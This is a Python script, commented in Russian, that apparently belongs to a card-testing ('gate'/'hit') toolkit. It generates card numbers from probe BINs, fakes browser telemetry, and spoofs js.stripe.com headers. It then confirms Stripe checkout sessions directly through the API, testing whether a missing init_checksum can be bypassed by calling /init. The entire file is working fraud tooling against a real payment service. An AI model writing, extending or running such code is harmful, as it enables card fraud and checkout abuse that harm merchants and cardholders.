# language: Python 3.12+, file: _audit/exp_rotate_init.py, target: Windows 11
"""Эксперимент: можно ли подтверждать сессию, выпущенную по API (без открытия в браузере).

Такая сессия приходит с пустым init_checksum — проверяем, нужен ли он confirm и лечится ли вызовом /init.

Запуск: python _audit/exp_rotate_init.py <файл со ссылкой>
"""
import asyncio
import sys
import uuid

sys.path.insert(0, "C:/Users/Redmi/Downloads/pusto")

import config  # noqa: E402
import gate_client as gc  # noqa: E402
import hit_gate as hg  # noqa: E402

HEADERS = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}


async def tokenize(gs):
    import random
    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    telem = gs.synthesize_telemetry()
    body = gc.tokenize_body({"number": p["number"], "mm": p["mm"], "yy": p["yy"], "cvc": p["cvc"]}, telem, gs.url.split("#")[0])
    res = await gc.tokenize_payment_method(gs.s, body, timeout=12)
    return res.get("id")


async def confirm(gs, pm_id, label):
    body = {"key": gs.pk, "eid": str(uuid.uuid4()), "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "expected_amount": str(gs.expected_amount or gs.amount),
            "return_url": gs.url.split("#")[0]}
    if gs.checksum:
        body["init_checksum"] = gs.checksum
    r = await gs.s.post(f"https://api.stripe.com/v1/payment_pages/{gs.cs}/confirm", data=body, headers=HEADERS, timeout=20)
    try:
        j = r.json() or {}
    except Exception:
        j = {"raw": r.text[:200]}
    err = j.get("error") or {}
    pi = j.get("payment_intent") or {}
    print(f"  [{label}] http={r.status_code} code={err.get('code')!r} msg={str(err.get('message'))[:130]!r} pi={pi.get('id')} {pi.get('status')}")
    return r.status_code, err


async def main():
    url = open(sys.argv[1], encoding="utf-8").read().strip()
    gs = hg.CsHitSession(url)
    ok, detail = await gs.open()
    print(f"open={ok} {detail} | checksum={bool(gs.checksum)} | сумма={gs.expected_amount or gs.amount}{gs.currency}")
    if not ok:
        return
    pm = await tokenize(gs)
    status, err = await confirm(gs, pm, "без init_checksum")
    if status == 200:
        await gs.close()
        return
    if "checksum" not in str(err.get("code") or "") + str(err.get("message") or ""):
        print("  отказ не про checksum — /init не пробуем")
        await gs.close()
        return
    r = await gs.s.post(f"https://api.stripe.com/v1/payment_pages/{gs.cs}/init",
                        data={"key": gs.pk, "eid": "NA", "browser_locale": "ru-RU",
                              "browser_timezone": "Europe/Moscow", "redirect_type": "url"},
                        headers=HEADERS, timeout=15)
    print(f"  /init -> http={r.status_code}")
    rr = await gs.s.get(f"https://api.stripe.com/v1/payment_pages/{gs.cs}", params={"key": gs.pk}, headers=HEADERS, timeout=12)
    gs.checksum = str(((rr.json() or {}).get("init_checksum") or ""))
    print(f"  после /init checksum={bool(gs.checksum)}")
    pm2 = await tokenize(gs)
    await confirm(gs, pm2, "после /init")
    await gs.close()


asyncio.run(main())